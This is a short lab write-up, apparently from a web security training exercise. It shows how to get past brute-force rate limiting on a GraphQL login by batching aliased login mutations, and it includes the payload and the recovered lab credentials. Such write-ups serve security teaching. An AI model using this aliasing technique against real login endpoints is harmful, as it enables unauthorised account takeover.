# Lab: Bypassing GraphQL brute force protections

> Lab Objective: brute force the login mechanism to sign in as carlos.

- Try to login using test credentials `test:test`, then inspect the GraphQL Request.
  ![1st screenshot](./attachments/1.png)

- Send this request to repeater, and after repeating the failed request multiple times, you'll notice that you've gotten blocked.
  ![2nd screenshot](./attachments/2.png)

- But when you request multiple login attempts in the same GraphQL Endpoint using aliases, the request is accepted and you're not blocked.

- The GraphQL:

```json
{
  "query": "\n mutation login($input: LoginInput!) {\n login1: login(input: $input) {\n token\n success\n }\n login2: login(input: $input) {\n token\n success\n }\n  login3: login(input: $input) {\n token\n success\n }\n login4: login(input: $input) {\n token\n success\n }\n login5: login(input: $input) {\n token\n success\n }\n }",
  "operationName": "login",
  "variables": { "input": { "username": "test", "password": "test" } }
}
```

- The Request & Response:
  ![3rd screenshot](./attachments/3.png)

- Use the attached python script with the list of passwords to automate the process of aliasing properties.

- After this process send the request, and search for `success:true`, and you'll notice that the 25th request is the right password.
  ![4th screenshot](./attachments/4.png)
  ![5th screenshot](./attachments/5.png)

- Take the retrieved credentials `carlos:654321`, and login with them.
  ![6th screenshot](./attachments/6.png)

- And you've access to Carlos's Account and the lab is solved.
  ![7th screenshot](./attachments/7.png)

---
